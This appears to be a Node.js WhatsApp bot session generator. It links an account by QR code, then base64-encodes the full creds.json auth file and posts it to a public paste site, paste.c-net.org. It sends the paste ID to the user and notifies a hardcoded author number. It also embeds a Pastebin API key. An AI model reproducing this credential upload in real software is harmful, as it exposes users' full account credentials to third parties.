const fs   = require("fs-extra");
const pino = require("pino");
let qrcode = require("qrcode-terminal");
const PastebinAPI = require("pastebin-js");
const path = require('path');
const axios = require("axios");
pastebin = new PastebinAPI("EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL");

//QR BY CYBER DEXTER +94785274495
//Don't copy my code without giving credits

if (fs.existsSync('./auth_info_baileys')) {
  fs.emptyDirSync(__dirname + '/auth_info_baileys');
  require('child_process').exec('rm -rf auth_info_baileys')
  console.log('\nPlease Wait... Removing Cache files');
  setTimeout(() => {   console.log('Q')    }, 100);
  setTimeout(() => {   console.log('R')    }, 300);
  setTimeout(() => {   console.log(' ')    }, 500);
  setTimeout(() => {   console.log('B')    }, 700);
  setTimeout(() => {   console.log('Y')    }, 900);
  setTimeout(() => {   console.log(' ')    }, 1100);
  setTimeout(() => {   console.log('M')    }, 1300);
  setTimeout(() => {   console.log('A')    }, 1500);
  setTimeout(() => {   console.log('H')    }, 1700);
  setTimeout(() => {   console.log('E')    }, 1900);
  setTimeout(() => {   console.log('R')    }, 2100);
  setTimeout(() => {   console.log(' ')    }, 2300);
  setTimeout(() => {   console.log('Z')    }, 2500);
  setTimeout(() => {   console.log('U')    }, 2700);
  setTimeout(() => {   console.log('B')    }, 2900);
  setTimeout(() => {   console.log('A')    }, 3100);
  setTimeout(() => {   console.log('I')    }, 3300);
  setTimeout(() => {   console.log('R')    }, 3500);
  setTimeout(() => {   console.log('ᴄᴀᴄʜᴇ ᴄʟᴇᴀʀᴇᴅ...!\nʀᴜɴ ᴛʜᴇ ʀᴇᴘʟ ᴀɢᴀɪɴ')    }, 3700);
  setTimeout(() => {   process.exit()      }, 3800)
};
setTimeout(() => {
  const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, makeInMemoryStore, } = require("@sampandey001/baileys");
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
  async function Maher_Zubair() {
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys')
    try {
      let session = makeWASocket({ printQRInTerminal: true, logger: pino({ level: "silent" }), browser: Browsers.macOS("Desktop"), auth: state });
      session.ev.on("connection.update", async (s) => {
        const { connection, lastDisconnect, qr } = s;
        if (connection == "open")
        {
          await delay(500);
          let user = session.user.id;         // User = Number of that user who just Scanned the Qr
          var c2 = '';
//===========================================================================================
//===============================  SESSION ID 1   ===========================================
//===========================================================================================
          try { 
            let data = await fs.readFileSync(__dirname+'/auth_info_baileys/creds.json','utf-8')  
            await delay(800)
            const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`,{headers:{'Content-Type':'application/x-www-form-urlencoded'}});
             c2 = output.data.split('/')[3]
            await delay(500);
            let session_id1 = await session.sendMessage(user, {text: 'CYBER-MD;;;'+c2});
            await session.sendMessage("94785274495@s.whatsapp.net", { text: '*ǫʀ ᴄᴏᴅᴇ ʜᴀs ʙᴇᴇɴ sᴄᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.*' } , {quoted : session_id1});
          }catch (e) {console.log(e)}
//===========================================================================================
//===============================  SESSION ID 2   ===========================================
//===========================================================================================
          let unique = fs.readFileSync(__dirname + '/auth_info_baileys/creds.json')
          c = Buffer.from(unique).toString('base64')
          console.log(`
====================  SESSION ID 1  ==========================                   
SESSION-ID 1 ==> ${c}

====================  SESSION ID 2  ========================== 
SESSION-ID 2 => ' ${c2}

Don't provide your SESSION_ID to anyone otherwise that user can access your account
Thanks.
-------------------   SESSION CLOSED   -----------------------
`)   




          
let cc = `┏━━⟪⟪ WELCOME DARK-EWING MD ⟫━⦿
┃✗『 *•ᴀᴍᴀᴢɪɴɢ ʏᴏᴜ ᴄʜᴏᴏsᴇ•* 』
┃✗              *•DARK EWINGᴹᴰ•*
┃✗ *•ʏᴏᴜ sᴜᴄᴄᴇssғᴜʟʟʏ sᴄᴀɴ•*
┃✗ *•ǫʀ ғᴏʀ sᴇssɪᴏɴ•*
┃✗ *•ᴏᴡɴᴇʀ• CYBER DEXTER*
┃✗ *•ɴᴏᴛᴇ• ᴅᴏɴ'ᴛ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ*
┃✗ *sᴇssɪᴏɴ ɪᴅ ᴛᴏ ᴀɴʏ-ᴏɴᴇ*
┗━━━━━━━━━━⦿

*•sᴜᴘᴘᴏʀᴛ ᴍᴇ ᴏɴ ʏᴏᴜ-ᴛᴜʙᴇ•*
https://youtube.com/@CYBERDEXTERTOOL?si=NsWb47_f3g5t7hoH
*•sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ•*
https://chat.whatsapp.com/JXUE45NloA0DSUl549cmKL
*•ᴄʜᴇᴄᴋ ᴍʏ ᴡᴇʙ ꜰᴏʀ ᴍᴏʀᴇ•*
https://sites.google.com/view/cyberdexter/home
`;
          let session_id = await session.sendMessage(user, { text: "DARK-EWING;;;" + c });
          await session.sendMessage(user, { text: cc } , { quoted : session_id });
          
          await require('child_process').exec('rm -rf auth_info_baileys')
          process.exit(1)
        }
        session.ev.on('creds.update', saveCreds)
       if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) { Maher_Zubair(); }
      });
    } catch (err) {console.log(err);await require('child_process').exec('rm -rf auth_info_baileys');process.exit(1);}
  }
  Maher_Zubair();
}, 3000)
